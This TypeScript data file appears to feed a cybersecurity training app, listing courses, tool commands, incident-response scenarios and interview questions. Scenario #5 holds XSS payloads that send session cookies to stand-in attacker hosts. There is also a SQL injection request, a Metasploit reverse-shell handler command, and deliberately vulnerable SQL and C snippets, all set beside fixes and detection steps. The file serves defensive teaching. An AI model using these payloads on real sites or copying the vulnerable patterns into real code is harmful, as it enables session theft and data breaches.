export interface SecurityResourceItem {
  id: string;
  title: string;
  category: "Ethical Hacking" | "Digital Forensics" | "Cloud Security" | "Network Defense" | "Malware Analysis";
  level: "Beginner" | "Intermediate" | "Advanced" | "Expert";
  lessonsCount: number;
  durationMinutes: number;
  description: string;
  linkedSkill: string;
  externalUrl?: string;
  keyTopics: string[];
}

export interface SecurityToolRef {
  name: string;
  category: string;
  purpose: string;
  commandExample: string;
  useCase: string;
}

export interface SecurityQuestionItem {
  id: number;
  category: "Web Security" | "Digital Forensics" | "Network & Cryptography" | "Incident Response" | "Reverse Engineering";
  question: string;
  answer: string;
  commandSnippet?: string;
  difficulty: "Beginner" | "Intermediate" | "Advanced" | "Expert";
}

export interface RealWorldScenarioItem {
  id: string;
  title: string;
  category: "Web Vulnerability Fix" | "Memory Forensics Triage" | "Network Traffic Incident" | "Cloud Incident" | "Session Hijacking";
  difficulty: "Intermediate" | "Advanced" | "Expert";
  threatContext: string;
  attackVectorSnippet: string;
  investigationCommands: string[];
  resolutionSteps: string[];
  remediationCodeSnippet: string;
  preventativeBestPractices: string[];
}

export const CYBERSECURITY_COURSES: SecurityResourceItem[] = [
  {
    id: "sec-101",
    title: "Ethical Hacking & Penetration Testing Fundamentals",
    category: "Ethical Hacking",
    level: "Beginner",
    lessonsCount: 12,
    durationMinutes: 240,
    linkedSkill: "Penetration Testing",
    description: "Master reconnaissance, vulnerability scanning, OWASP Top 10 web exploitation, and privilege escalation methodologies.",
    externalUrl: "https://portswigger.net/web-security",
    keyTopics: ["Nmap & Shodan Recon", "OWASP Top 10 (SQLi, XSS, CSRF)", "Burp Suite Proxy", "Metasploit Framework", "LinPEAS & WinPEAS PrivEsc"]
  },
  {
    id: "sec-102",
    title: "Digital Forensics & Incident Response (DFIR)",
    category: "Digital Forensics",
    level: "Intermediate",
    lessonsCount: 10,
    durationMinutes: 210,
    linkedSkill: "Digital Forensics",
    description: "Perform disk image analysis, volatile memory extraction, network PCAP forensics, and evidence chain of custody.",
    externalUrl: "https://www.autopsy.com",
    keyTopics: ["FTK Imager & Autopsy", "Volatility RAM Forensics", "Wireshark PCAP Triage", "Windows Registry & Prefetch Artifacts", "Chain of Custody"]
  },
  {
    id: "sec-103",
    title: "Cloud Security Architecture & Container Hardening",
    category: "Cloud Security",
    level: "Advanced",
    lessonsCount: 10,
    durationMinutes: 270,
    linkedSkill: "Cloud Security",
    description: "Hardening AWS/Azure infrastructure, IAM least privilege, Kubernetes security, SIEM integration, and IaC vulnerability scanning.",
    externalUrl: "https://kubernetes.io/docs/concepts/security",
    keyTopics: ["AWS IAM & Security Groups", "Trivy & Kube-bench", "Falco Runtime Security", "Splunk & Elastic SIEM", "Checkov IaC Auditing"]
  },
  {
    id: "sec-104",
    title: "Network Defense, Cryptography & SIEM Operations",
    category: "Network Defense",
    level: "Intermediate",
    lessonsCount: 10,
    durationMinutes: 200,
    linkedSkill: "Network Security",
    description: "Implement firewalls, IDS/IPS Snort rules, PKI certificates, AES/RSA encryption, and SOC alert triage under MITRE ATT&CK.",
    externalUrl: "https://mitre-attack.github.io",
    keyTopics: ["Snort & Suricata IDS", "AES-256, RSA & SHA-256", "PKI & TLS 1.3 Handshake", "PfSense Firewall Rules", "MITRE ATT&CK TTP Mapping"]
  },
  {
    id: "sec-105",
    title: "Reverse Engineering & Malware Analysis",
    category: "Malware Analysis",
    level: "Expert",
    lessonsCount: 8,
    durationMinutes: 300,
    linkedSkill: "Reverse Engineering",
    description: "Disassemble malicious executables with Ghidra & IDA Pro, unpack obfuscated binaries, and analyze dynamic C2 behavior.",
    externalUrl: "https://ghidra-sre.org",
    keyTopics: ["x86/x64 Assembly & Registers", "Ghidra Decompilation", "PEStudio & PEbear", "Dynamic Analysis in x64dbg", "C2 Beacon Analysis"]
  }
];

export const FORENSICS_SECURITY_TOOLS: SecurityToolRef[] = [
  {
    name: "Nmap",
    category: "Reconnaissance",
    purpose: "Network discovery and vulnerability port scanner.",
    commandExample: "nmap -sC -sV -p- -T4 192.168.1.100 -oA target_scan",
    useCase: "Scan active ports, service versions, OS signatures, and run default NSE security scripts."
  },
  {
    name: "Wireshark / TShark",
    category: "Network Forensics",
    purpose: "Deep packet inspection and network protocol analyzer.",
    commandExample: "tshark -r capture.pcap -Y 'http.request.method == POST' -T fields -e ip.src -e http.host",
    useCase: "Analyze suspicious network traffic, extract cleartext credentials, and reconstruct TCP streams."
  },
  {
    name: "Volatility 3",
    category: "Memory Forensics",
    purpose: "Advanced volatile memory (RAM) extraction framework.",
    commandExample: "vol -f memdump.raw windows.pstree.PsTree",
    useCase: "Inspect active process trees, detect hidden DLL injections, and extract unencrypted encryption keys from RAM."
  },
  {
    name: "Autopsy",
    category: "Disk Forensics",
    purpose: "GUI-based digital forensics platform for hard drive & mobile analysis.",
    commandExample: "autopsy --case-dir /cases/investigation_01",
    useCase: "Recover deleted files, parse browser histories, EXIF metadata, timeline events, and EX3/NTFS artifacts."
  },
  {
    name: "Burp Suite",
    category: "Web Security",
    purpose: "Interception proxy and web application vulnerability scanner.",
    commandExample: "http://127.0.0.1:8080 (Proxy Listener)",
    useCase: "Intercept HTTP requests, perform SQL injection, XSS payload testing, and API security auditing."
  },
  {
    name: "Ghidra",
    category: "Reverse Engineering",
    purpose: "NSA-developed software reverse engineering (SRE) suite.",
    commandExample: "ghidraHeadless /projects MyProj -import malware.exe -analyze",
    useCase: "Decompile binary executables to C pseudo-code, inspect functions, and analyze malware control flow."
  },
  {
    name: "Metasploit",
    category: "Exploitation",
    purpose: "Penetration testing platform for developing and executing exploit code.",
    commandExample: "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; run'",
    useCase: "Simulate real-world adversary attacks to test defensive posture and intrusion detection."
  },
  {
    name: "Splunk / Elastic SIEM",
    category: "SOC & Logging",
    purpose: "Security Information and Event Management platform for log correlation.",
    commandExample: "index=windows EventCode=4625 | stats count by TargetUserName, src_ip",
    useCase: "Correlate failed login attempts, detect brute force attacks, and trigger SOC incident alerts."
  }
];

export const REAL_WORLD_SECURITY_SCENARIOS: RealWorldScenarioItem[] = [
  {
    id: "scenario-sqli-leak",
    title: "Scenario #1: E-Commerce SQL Injection & Data Exfiltration Attack",
    category: "Web Vulnerability Fix",
    difficulty: "Intermediate",
    threatContext: "An attacker exploited an un-sanitized search API endpoint on an e-commerce platform. Using UNION-based SQL injection, they extracted user password hashes and credit card tokens from the PostgreSQL database.",
    attackVectorSnippet: "// ATTACK VECTOR (Nginx Log Snippet):\nGET /api/v1/products?search=shoes%27%20UNION%20SELECT%20id,username,password_hash%20FROM%20users-- HTTP/1.1\nHost: target-store.com\nUser-Agent: sqlmap/1.6#stable",
    investigationCommands: [
      "grep -Ei '(union|select|insert|concat|sleep)' /var/log/nginx/access.log | head -n 20",
      "psql -U postgres -d store_db -c \"SELECT query, calls, total_exec_time FROM pg_stat_statements ORDER BY total_exec_time DESC LIMIT 5;\""
    ],
    resolutionSteps: [
      "1. Immediate Containment: Block the attacker's IP address on Cloudflare WAF and return HTTP 403.",
      "2. Code Patching: Replace dynamic SQL string formatting with parameterized prepared statements.",
      "3. Evidence Preservation: Capture database audit logs and isolate affected database replica for forensic hashing.",
      "4. Password Reset: Force global password resets for impacted accounts and invalidate active JWT sessions."
    ],
    remediationCodeSnippet: "// VULNERABLE CODE:\nconst query = `SELECT * FROM products WHERE name LIKE '%${req.query.search}%'`;\nconst result = await db.query(query);\n\n// SECURE REMEDIATION (Parameterized Prepared Statement):\nconst query = 'SELECT id, name, price, stock FROM products WHERE name ILIKE $1';\nconst result = await db.query(query, [`%${req.query.search}%`]);",
    preventativeBestPractices: [
      "Always use Object-Relational Mappers (ORMs like SQLAlchemy/Prisma) or parameterized placeholders.",
      "Enforce Web Application Firewall (WAF) SQLi rules (ModSecurity / AWS WAF).",
      "Apply Database Principle of Least Privilege: DB user should not have read access to system tables."
    ]
  },
  {
    id: "scenario-ram-forensics",
    title: "Scenario #2: Ransomware Memory Investigation & Unpacking (DFIR)",
    category: "Memory Forensics Triage",
    difficulty: "Advanced",
    threatContext: "A workstation triggered a SOC ransomware alert. The malware spawned a disguised process `svchost_fake.exe` from `C:\\Users\\Public`, injected code into `explorer.exe`, and established a command & control (C2) connection.",
    attackVectorSnippet: "// PROCESS INJECTION PATTERN (RAM Dump Artifact):\nProcess PID: 4892 (svchost_fake.exe)\nParent PID: 2104 (cmd.exe)\nInjected DLL Memory Space: 0x00400000 -> VirtualAllocEx + WriteProcessMemory into PID 1420 (explorer.exe)",
    investigationCommands: [
      "# 1. List active process tree from volatile RAM dump:\nvol -f memory_dump.raw windows.pstree",
      "# 2. Detect hidden process injections and memory hooks:\nvol -f memory_dump.raw windows.malfind",
      "# 3. Dump active network connections from RAM:\nvol -f memory_dump.raw windows.netscan | grep -E 'ESTABLISHED'"
    ],
    resolutionSteps: [
      "1. Host Isolation: Disconnect infected host from local network immediately (disable Wi-Fi / unplug Ethernet).",
      "2. Memory Capture: Extract full physical RAM dump using FTK Imager CLI before shutting down system.",
      "3. C2 Blocking: Block malicious C2 IP address (e.g. 185.220.101.5) on firewall and perimeter router.",
      "4. Remediation & Restore: Kill rogue process tree, remove persistence registry keys under `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`, and restore encrypted files from immutable offsite backups."
    ],
    remediationCodeSnippet: "# PowerShell Remediation & Process Tree Kill Script:\nGet-Process -Name \"svchost_fake\" -ErrorAction SilentlyContinue | Stop-Process -Force\nRemove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"UpdateService\" -Force\n\n# Block malicious C2 IP on Windows Firewall:\nNew-NetFirewallRule -DisplayName \"Block Malicious C2\" -Direction Outbound -Action Block -RemoteAddress \"185.220.101.5\"",
    preventativeBestPractices: [
      "Enforce Application Whitelisting / AppLocker blocking executable runs from `C:\\Users\\Public`.",
      "Deploy Endpoint Detection & Response (EDR) with automated process memory isolation.",
      "Maintain offline write-once-read-many (WORM) immutable backups."
    ]
  },
  {
    id: "scenario-c2-pcap",
    title: "Scenario #3: Suspicious Outbound Cobalt Strike C2 Traffic via Wireshark",
    category: "Network Traffic Incident",
    difficulty: "Advanced",
    threatContext: "SIEM flagged an unusual outbound HTTP POST traffic pattern repeating every 30 seconds from an internal IP `192.168.1.145` to an external domain `http://update-check-service.com`.",
    attackVectorSnippet: "// TSHARK CAPTURED PACKET HEADER:\nPOST /api/v1/telemetry HTTP/1.1\nHost: update-check-service.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nContent-Length: 512\nPayload: [Base64 Encrypted Beacon Pulse: dGhyZWF0X2FjdG9yX2JlYWNvbg==]",
    investigationCommands: [
      "# Filter HTTP POST requests and extract destination IP & URI:\ntshark -r network_capture.pcap -Y 'http.request.method == POST' -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri",
      "# Check SSL/TLS SNI certificates for suspicious domains:\ntshark -r network_capture.pcap -Y 'tls.handshake.extensions_server_name' -T fields -e tls.handshake.extensions_server_name | sort | uniq -c"
    ],
    resolutionSteps: [
      "1. DNS Sinkholing: Configure internal DNS servers (Pi-hole / BIND / Infoblox) to resolve `update-check-service.com` to `127.0.0.1`.",
      "2. Credentials Revocation: Force password and Kerberos ticket reset for user logged onto host `192.168.1.145`.",
      "3. IDS Signature Deployment: Write custom Suricata / Snort rule detecting Cobalt Strike beacon HTTP header signatures.",
      "4. Endpoint Re-imaging: Wiping infected machine, applying pristine OS image, and verifying host telemetry."
    ],
    remediationCodeSnippet: "# Suricata Custom IDS Rule:\nalert http $HOME_NET any -> $EXTERNAL_NET any (\n  msg:\"MALWARE-OTHER Cobalt Strike Beacon HTTP POST Heartbeat\";\n  content:\"POST\"; http_method;\n  content:\"/api/v1/telemetry\"; http_uri;\n  content:\"update-check-service.com\"; http_header;\n  classtype:trojan-activity;\n  sid:9000101; rev:1;\n)",
    preventativeBestPractices: [
      "Restrict outbound traffic using Next-Generation Firewalls (NGFW) with SSL/TLS inspection.",
      "Enforce strict egress domain filtering and DNS-over-HTTPS (DoH) inspection.",
      "Monitor beaconing jitter patterns using network anomaly detection tools (Zeek / Bro)."
    ]
  },
  {
    id: "scenario-aws-iam-leak",
    title: "Scenario #4: AWS IAM Access Key Compromise & Crypto-Mining Hijack",
    category: "Cloud Incident",
    difficulty: "Advanced",
    threatContext: "An engineer accidentally committed an unencrypted `.env` file containing AWS programmatic keys (`AKIAIOSFODNN7EXAMPLE`) to a public GitHub repository. Within 12 minutes, automated bots used the key to launch 20 high-cost `g4dn.12xlarge` EC2 instances for crypto-mining in `eu-west-1`.",
    attackVectorSnippet: "// AWS CLOUDTRAIL EVENT LOG:\n{\n  \"eventTime\": \"2026-08-14T20:14:02Z\",\n  \"eventName\": \"RunInstances\",\n  \"userAgent\": \"boto3/1.26.0 Python/3.10\",\n  \"sourceIPAddress\": \"198.51.100.44\",\n  \"requestParameters\": {\n    \"instanceType\": \"g4dn.12xlarge\",\n    \"minCount\": 20\n  }\n}",
    investigationCommands: [
      "aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=RunInstances --region eu-west-1",
      "aws iam list-access-keys --user-name dev-deployer-user"
    ],
    resolutionSteps: [
      "1. Key Invalidation: Delete or immediately deactivate the compromised IAM access key pair.",
      "2. Resource Termination: Terminate all unauthorized EC2 instances and delete rogue security groups in `eu-west-1`.",
      "3. Account Quarantine: Attach an explicit Deny policy to the impacted IAM user.",
      "4. Git Cleanup: Scrub repository history using `git-filter-repo` / BFG Repo-Cleaner and rotate all secrets."
    ],
    remediationCodeSnippet: "# AWS CLI Immediate Key Deactivation:\naws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Inactive --user-name dev-deployer-user\n\n# Terminate Rogue EC2 Instances:\naws ec2 terminate-instances --instance-ids i-0123456789abcdef0 i-0fedcba9876543210 --region eu-west-1",
    preventativeBestPractices: [
      "Use Git pre-commit hooks (TruffleHog, Gitleaks) to prevent committing secrets.",
      "Use AWS IAM Roles with short-lived STS tokens instead of long-lived access keys.",
      "Set AWS Service Control Policies (SCPs) restricting EC2 instance creation to approved regions."
    ]
  },
  {
    id: "scenario-xss-cookie",
    title: "Scenario #5: Stored XSS Session Cookie Theft & Remediation",
    category: "Session Hijacking",
    difficulty: "Intermediate",
    threatContext: "An attacker posted a malicious comment on a forum application: `<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>`. Whenever administrators viewed the comments dashboard, their session token was silently exfiltrated to the attacker's server.",
    attackVectorSnippet: "// MALICIOUS XSS PAYLOAD PERSISTED IN DB:\n<script>\n  const sessionCookie = document.cookie;\n  new Image().src = 'http://attacker-server.net/log?data=' + encodeURIComponent(sessionCookie);\n</script>",
    investigationCommands: [
      "psql -U postgres -d forum_db -c \"SELECT id, user_id, content FROM comments WHERE content LIKE '%<script%' OR content LIKE '%document.cookie%';\"",
      "grep -i 'attacker-server.net' /var/log/nginx/access.log"
    ],
    resolutionSteps: [
      "1. Sanitization: Sanitize all existing database entries removing dangerous HTML/JS tags.",
      "2. Input Escaping: Apply DOMPurify or server-side context-aware HTML entity encoding on user inputs.",
      "3. Cookie Security: Set `HttpOnly`, `Secure`, and `SameSite=Strict` flags on session cookies so JavaScript cannot access `document.cookie`.",
      "4. CSP Header Deployment: Implement strict Content Security Policy headers restricting inline scripts."
    ],
    remediationCodeSnippet: "// SECURE EXPRESS.JS COOKIE CONFIGURATION:\napp.use(session({\n  name: '__Host-session',\n  secret: process.env.SESSION_SECRET,\n  cookie: {\n    httpOnly: true,  // Prevents JavaScript access (XSS defense!)\n    secure: true,    // Enforces HTTPS-only transmission\n    sameSite: 'strict' // Prevents Cross-Site Request Forgery (CSRF)\n  }\n}));\n\n// SERVER-SIDE INPUT SANITIZATION:\nimport DOMPurify from 'isomorphic-dompurify';\nconst cleanComment = DOMPurify.sanitize(req.body.comment);",
    preventativeBestPractices: [
      "Always set HttpOnly on authentication cookies to render XSS cookie theft impossible.",
      "Implement a strong Content-Security-Policy (CSP): `script-src 'self'`.",
      "Use modern frontend frameworks (React, Vue) that automatically escape rendered variables."
    ]
  }
];

export const CYBERSECURITY_QUESTIONS: SecurityQuestionItem[] = [
  {
    id: 1001,
    category: "Web Security",
    question: "What is SQL Injection (SQLi) and how do you prevent it?",
    answer: "SQL Injection occurs when untrusted user input is directly concatenated into a database query, allowing attackers to manipulate query logic. It is prevented using Parameterized Queries (Prepared Statements), ORMs, and strict input validation.",
    commandSnippet: "// VULNERABLE:\nconst query = `SELECT * FROM users WHERE username = '${req.body.user}'`;\n\n// SECURE (Parameterized):\nconst query = 'SELECT * FROM users WHERE username = $1';\nawait db.query(query, [req.body.user]);",
    difficulty: "Beginner"
  },
  {
    id: 1002,
    category: "Web Security",
    question: "What is Cross-Site Scripting (XSS) and what are its main types?",
    answer: "XSS occurs when an application includes untrusted data in a web page without proper validation or escaping, executing malicious scripts in victim browsers. Types: 1) Stored XSS (persisted in DB), 2) Reflected XSS (in URL query string), 3) DOM-based XSS (client-side script modification). Prevention: Context-aware HTML escaping, Content Security Policy (CSP), and HTTPOnly cookies.",
    commandSnippet: "<!-- Content-Security-Policy Header -->\nHeader set Content-Security-Policy \"default-src 'self'; script-src 'self' https://trusted.cdn.com\"",
    difficulty: "Intermediate"
  },
  {
    id: 1003,
    category: "Digital Forensics",
    question: "What is Volatility and how is memory forensics performed during incident triage?",
    answer: "Volatility is an open-source memory forensics framework used to analyze RAM dumps. In DFIR, RAM analysis reveals live unencrypted memory artifacts (running processes, active network connections, injected DLLs, unencrypted passwords) that are wiped upon system shutdown.",
    commandSnippet: "# List process tree from RAM dump:\nvol -f mem.raw windows.pstree\n\n# Dump hidden network connections:\nvol -f mem.raw windows.netscan",
    difficulty: "Intermediate"
  },
  {
    id: 1004,
    category: "Digital Forensics",
    question: "Explain the Chain of Custody in Digital Forensics.",
    answer: "Chain of Custody is a meticulous documentation record establishing the chronological tracking of physical or digital evidence acquisition, transfer, analysis, and storage. It proves evidence integrity and admissibility in court by proving no tampering occurred.",
    commandSnippet: "# Generate cryptographic hash verification for disk image:\nsha256sum evidence_drive.dd > evidence_drive.sha256",
    difficulty: "Beginner"
  },
  {
    id: 1005,
    category: "Network & Cryptography",
    question: "Difference between Symmetric and Asymmetric Encryption?",
    answer: "Symmetric Encryption (e.g. AES-256) uses the exact same key for both encryption and decryption (very fast, used for bulk data). Asymmetric Encryption (e.g. RSA, ECC) uses a Public Key for encryption and a distinct Private Key for decryption (slower, used for key exchange and digital signatures).",
    difficulty: "Beginner"
  },
  {
    id: 1006,
    category: "Network & Cryptography",
    question: "How does the TLS 1.3 Handshake work?",
    answer: "TLS 1.3 establishes an encrypted connection in 1 Round Trip Time (1-RTT). 1) ClientHello sends supported cipher suites and key share. 2) ServerHello sends selected cipher, server key share, certificate, and digital signature. 3) Both parties generate symmetric session keys using ECDHE and immediately encrypt data.",
    difficulty: "Intermediate"
  },
  {
    id: 1007,
    category: "Incident Response",
    question: "What are the 6 phases of the PICERL Incident Response Lifecycle?",
    answer: "NIST/SANS PICERL Framework: 1) Preparation (tools & policies), 2) Identification (detect anomaly), 3) Containment (isolate affected hosts), 4) Eradication (remove malware/threat actor), 5) Recovery (restore clean systems), 6) Lessons Learned (post-incident report).",
    difficulty: "Intermediate"
  },
  {
    id: 1008,
    category: "Incident Response",
    question: "What is the MITRE ATT&CK Framework and how is it used in SOC Operations?",
    answer: "MITRE ATT&CK is a globally accessible knowledge base of adversary tactics, techniques, and procedures (TTPs) based on real-world observations. SOC analysts use it to categorize threat behaviors, design SIEM detection rules, and perform red/blue team assessments.",
    difficulty: "Intermediate"
  },
  {
    id: 1009,
    category: "Reverse Engineering",
    question: "What is a Buffer Overflow and how do ASLR & DEP/NX protect against it?",
    answer: "Buffer Overflow occurs when a program writes more data to a buffer than allocated, overwriting adjacent stack memory and altering execution flow (e.g. overriding return address). Protection: DEP/NX (Data Execution Prevention) marks stack/heap non-executable. ASLR (Address Space Layout Randomization) randomizes memory addresses on boot.",
    commandSnippet: "// Vulnerable C Code:\nvoid vulnerable() {\n  char buffer[64];\n  gets(buffer); // No bounds checking!\n}",
    difficulty: "Advanced"
  },
  {
    id: 1010,
    category: "Reverse Engineering",
    question: "Difference between Static and Dynamic Malware Analysis?",
    answer: "Static Analysis examines binary code without running it (inspecting PE headers, imported DLLs, strings, decompiling with Ghidra). Dynamic Analysis executes the malware in an isolated Sandbox (Cuckoo, CAPEv2) to observe active behavior (file system modifications, registry edits, network C2 beacons).",
    difficulty: "Advanced"
  }
];
